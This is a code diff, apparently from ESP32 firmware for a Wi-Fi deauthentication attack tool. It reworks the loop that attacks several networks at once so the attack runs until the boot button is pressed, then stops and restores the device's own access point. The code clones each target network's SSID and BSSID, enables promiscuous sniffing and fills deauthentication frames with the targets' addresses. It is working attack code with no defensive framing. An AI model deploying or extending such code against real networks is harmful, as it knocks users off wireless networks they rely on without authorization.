@@ -3,6 +3,7 @@
 #include "types.h"
 #include "deauth.h"
 #include "definitions.h"
+#include "boot_button_pressed.h"
 
 deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_LIMITED;
@@ -74,18 +75,24 @@ void start_deauth(std::vector<int> wifi_numbers, int attack_type, uint16_t reaso
         return;
     }
     
-    while (wifi_numbers.size() > 1)  {
-      for (int wifi_number : wifi_numbers) {
-        if (wifi_number >= 0) {
-          WiFi.softAP(WiFi.SSID(wifi_number), (const char*)NULL, WiFi.channel(wifi_number));
-          memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
-          memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
-          esp_wifi_set_promiscuous(true);
-          esp_wifi_set_promiscuous_filter(&filt);
-          esp_wifi_set_promiscuous_rx_cb(&sniffer);
-          delay(200);
+    if (wifi_numbers.size() > 1)  {
+      while (!isBootButtonPressed_interrupt()) { 
+        for (int wifi_number : wifi_numbers) {
+          if (wifi_number >= 0) {
+            WiFi.softAP(WiFi.SSID(wifi_number), (const char*)NULL, WiFi.channel(wifi_number));
+            memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
+            memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_filter(&filt);
+            esp_wifi_set_promiscuous_rx_cb(&sniffer);
+            delay(200);
+          }
         }
       }
+      stop_deauth();
+      WiFi.mode(WIFI_MODE_AP);
+      WiFi.softAP(AP_SSID, AP_PASS);
+      DEBUG_PRINTLN("Deauth-Attack mode exited!");
     } return;
 
   } else if (deauth_type == DEAUTH_TYPE_ALL) {
